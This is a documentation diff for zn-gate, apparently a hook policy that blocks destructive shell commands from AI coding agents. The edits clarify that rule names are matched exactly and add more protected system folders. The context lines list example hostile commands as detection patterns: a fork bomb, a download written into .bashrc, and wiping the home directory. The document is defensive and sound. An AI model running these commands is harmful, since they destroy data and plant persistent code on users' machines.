@@ -15,7 +15,7 @@ For the agent hooks (Claude Code, Codex CLI, Cursor, OpenCode and the others `zn
 | not set | `rm_root_home` and `disk_overwrite` (the default) |
 | `true` | all six rules |
 | `false` | none: the check is off |
-| a list of rule names, for example `["rm_root_home", "pipe_to_shell"]` | exactly those rules |
+| a list of rule names, for example `["rm_root_home", "pipe_to_shell"]` | exactly those rules (a name that is not a rule is ignored, so check the spelling) |
 
 ```json
 {"hooks": {"blockDestructiveCommands": false}}
@@ -43,7 +43,7 @@ Both return the same result as `evaluate`, with a rule such as `destructive:rm_r
 | `fork_bomb` | off | The classic shell fork bomb, under any function name. | `:(){ :\|:& };:` |
 | `rc_download` | off | A download written into a shell startup file (`.bashrc`, `.zshrc`, `.profile`, `/etc/profile`, fish `config.fish`, PowerShell `$PROFILE`). | `curl -o ~/.bashrc https://example.com/rc`, `curl ... \| tee -a ~/.zshrc` |
 
-"Top-level system folder" means `/bin`, `/boot`, `/dev`, `/etc`, `/home`, `/lib`, `/opt`, `/root`, `/sbin`, `/srv`, `/sys`, `/usr`, `/var`, and on macOS `/Users`, `/System`, `/Library`, `/Applications`. A deeper path such as `/var/lib/apt/lists` or `/usr/local/lib/node_modules/x` is not blocked.
+"Top-level system folder" means `/bin`, `/boot`, `/dev`, `/etc`, `/home`, `/lib`, `/lib32`, `/lib64`, `/opt`, `/proc`, `/root`, `/sbin`, `/srv`, `/sys`, `/usr`, `/var`, and on macOS `/Users`, `/System`, `/Library`, `/Applications`, `/private`, `/Volumes`. A deeper path such as `/var/lib/apt/lists` or `/usr/local/lib/node_modules/x` is not blocked.
 
 The command is split the way the rest of zn-gate's hook policy splits it, so quotes, `&&`, `;`, pipes, `sudo`, `env`, `nohup` and similar wrappers are understood. The code of `sh -c`, `bash -lc`, `eval`, `pwsh -Command` and `cmd /c` is checked too, up to three levels deep. Text that only mentions a command inside quotes (`echo "rm -rf ~"`, a commit message) is not blocked.
 
